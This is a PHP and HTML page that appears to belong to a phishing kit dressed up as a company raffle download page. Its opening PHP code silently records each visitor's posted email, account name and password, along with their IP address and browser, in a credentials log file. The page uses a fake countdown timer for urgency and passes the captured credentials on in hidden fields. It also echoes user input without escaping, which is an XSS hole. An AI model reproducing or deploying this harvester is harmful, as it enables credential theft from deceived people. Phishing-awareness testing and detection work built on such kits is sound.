<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
  $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$browser = $_SERVER['HTTP_USER_AGENT'];
if(isset($_POST['email']) && isset($_POST['user']) && isset($_POST['pass']))
{
	file_put_contents("logs/enteredCredentials.txt", "Date: " . date("Y/m/d") . "(" . date("h:i:sa") . ") | Email: " . $_POST['email'] . " | Account: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $ipaddress . " | Agent: " . $browser . "\n", FILE_APPEND);
}
else
{
	file_put_contents("logs/enteredCredentials.txt", "Date: " . date("Y/m/d") . "(" . date("h:i:sa") . ") | NO EMAIL | NO ACCOUNT | NO PASSWORD (DIRECT ENTRY) | IP: " . $ipaddress . " | Agent: " . $browser . "\n", FILE_APPEND);
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="src/favicon.ico">
    <title>YOURCOMPANY Raffle</title>
    
    <!-- page css -->
    <link href="src/login-register-lock.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="src/style.min.css" rel="stylesheet">
    
    
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>

<body class="skin-default card-no-border">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label">YOURCOMPANY Raffle</p>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <section id="wrapper">
        <div class="login-register" style="background-image:url(src/login.jpg);">
            <div class="login-box card">
                <div class="card-body">
                    <form class="form-horizontal form-material" id="downloadForm" method="post" action="downloadSuccess.php">
						<img src="src/logo.jpg" class="img-fluid" ><br><br>
                        <h4 class="box-title text-center m-b-20">Hello <?php echo isset($_POST['user']) ? $_POST['user'] : ""?>! Your entry is ready</h4>
						<h5 class="box-title text-center m-b-20">Time left: <font color="red" id="demo">0d 0h 4m 33s </font>!</h5>
                        <div class="form-group text-center">
                            <div class="col-xs-12 p-b-20">
                                <button class="btn btn-block btn-lg btn-danger btn-rounded" type="submit">Download File</button>
							<input class="form-control" type="password" hidden name="email" value="<?php echo isset($_POST['email']) ? $_POST['email'] : "NO EMAIL - DIRECT VISIT"?>">
							<input class="form-control" type="password" hidden name="user" value="<?php echo isset($_POST['user']) ? $_POST['user'] : "NO USER - DIRECT VISIT"?>">
							<input class="form-control" type="password" hidden name="pass" value="<?php echo isset($_POST['pass']) ? $_POST['pass'] : "NO PASS - DIRECT VISIT"?>">
                            </div>
                        </div>
                    </form>
                    
                </div>
            </div>
        </div>
    </section>
    
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="src/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="src/popper.min.js"></script>
    <script src="src/bootstrap.min.js"></script>
    <!--Custom JavaScript -->
    <script type="text/javascript">
        $(function() {
            $(".preloader").fadeOut();
        });
        $(function() {
            $('[data-toggle="tooltip"]').tooltip()
        });
        // ============================================================== 
        // Login and Recover Password 
        // ============================================================== 
        $('#to-recover').on("click", function() {
            $("#loginform").slideUp();
            $("#recoverform").fadeIn();
        });
    </script>
    <script>
		// Set the date we're counting down to
		var today = new Date();
		today.setMinutes(today.getMinutes() + 4);
		today.setSeconds(today.getSeconds() + 34);
		var countDownDate = today.getTime();

		// Update the count down every 1 second
		var x = setInterval(function() {

		  // Get today's date and time
		  var now = new Date().getTime();
			
		  // Find the distance between now and the count down date
		  var distance = countDownDate - now;
			
		  // Time calculations for days, hours, minutes and seconds
		  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
		  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
		  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
		  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
			
		  // Output the result in an element with id="demo"
		  document.getElementById("demo").innerHTML = days + "d " + hours + "h "
		  + minutes + "m " + seconds + "s ";
			
		  // If the count down is over, write some text 
		  if (distance < 0) {
			clearInterval(x);
			document.getElementById("demo").innerHTML = "EXPIRED";
		  }
		}, 1000);
</script>
</body>

</html>